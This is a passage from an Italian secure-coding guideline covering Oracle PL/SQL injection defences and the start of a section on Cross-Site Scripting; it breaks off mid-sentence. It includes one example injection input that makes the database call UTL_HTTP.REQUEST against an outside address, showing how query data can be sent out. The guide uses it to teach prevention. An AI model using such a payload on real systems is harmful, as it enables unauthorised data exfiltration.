@@ -1,0 +1,53 @@
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 83  a 156  
+ 
+Esempio:  
+Forma non corretta: 
+SELECT TRANSLATE(‘input utentè, ‘0123456789ABCDEFGH IJKLMNOPQRSTUVWXYZ’, 
+‘0123456789’)  
+FROM DUAL;  
+Valorizzando l’input utente come: 
+ ‘’ || UTL_HTTP.REQUEST(‘http://10.0.0.1/ricevi.php’ ) || ‘’ 
+La procedura diventa: 
+SELECT TRANSLATE(‘’ || UTL_HTTP.REQUEST(‘http://10. 0.0.1/ricevi.php’) || ‘’, 
+‘0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ’,  ‘012345678 9’)  
+FROM DUAL; 
+• Prevenire l'upload remoto di file. È sempre necessa rio filtrare l'accesso al package UTL_FILE che 
+può essere il trasferimento di file tramite stored procedures. 
+• Prevenire l'injection di chiamata a funzioni. È sem pre necessario limitare opportunamente il 
+contesto di transazione di una procedura. È inoltre  necessario evitare di utilizzare la direttiva 
+PRAGMA AUTONOMOUS_TRANSACTION ove non necessario, o nde evitare di modificare il contesto 
+transazionale all'interno del quale la query viene eseguita. 
+• Dichiarazione dei privilegi di esecuzione delle pro cedure. È necessario: 
+• dichiarare le procedure utilizzando la keyword AUTH ID CURRENT_USER;  
+• revocare il privilegio EXECUTE sui pacchetti e sull e procedure standard di Oracle non utilizzati; 
+• garantire i permessi alle operazioni di creazione ( CREATE) e modifica (ALTER) di procedure 
+unicamente ad utenze "trusted"; 
+• definire i permessi delle funzioni associandoli uni camente ad utenti "trusted"; 
+• garantire il ruolo RESOURCE unicamente ad utenti "t rusted”. 
+ 
+7.4  Javascript 
+ 
+JavaScript è un linguaggio di programmazione interp retato, con tipizzazione debole e dinamica. Insieme  con 
+HTML e CSS, costituisce la tecnologia di base per r ealizzare pagine web. Negli ultimi anni Javascript ha 
+assunto un’importanza molto accentuata, grazie alla  diffusione di innumerevoli framework che ne 
+estendono e semplificano l’uso. Nuove versioni hann o fatto di Javascript un linguaggio moderno, flessi bile e 
+potente. Nato come linguaggio lato client, interpre tato esclusivamente dal browser, Javascript è oggi anche 
+diffuso come componente server-side supportato da R DBMS e web server. 
+7.4.1  Cross Site Scripting (XSS) 
+Come riconoscerla 
+Il problema principale veicolato da Javascript è il  Cross Site Scripting (XSS), che si attua inoculand o, 
+attraverso un canale di input non controllato né ve rificato, uno script malevolo. 
+Il canale attraverso il quale l’input fraudolento p uò entrare può essere il campo di un modulo o un 
+parametro passato attraverso l’url di una request G ET, o nel corpo di una request POST. 
+Uno script malevolo può inviare all’esterno infroma zioni sulla sessione, leggere i cookie, dati person ali e 
+altre informazioni riservate; può anche modificare la pagina attraverso la manipolazione del DOM (Doma in 
+Object Model) dell’HTML. Da questo punto in poi, l’ utente può essere tratto in inganno in molti modi: 
+potrebbe essere indotto a inserire dati personali i n una finta verifica o può essere dirottato su pagi ne fake 
+che ne carpiscano la fiducia. 
+Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
+all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
+dell’attacco. 
+Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
+come parte intregrante della pagina all’interno di un database e rispristinato ogni qual volta la pagi na in 
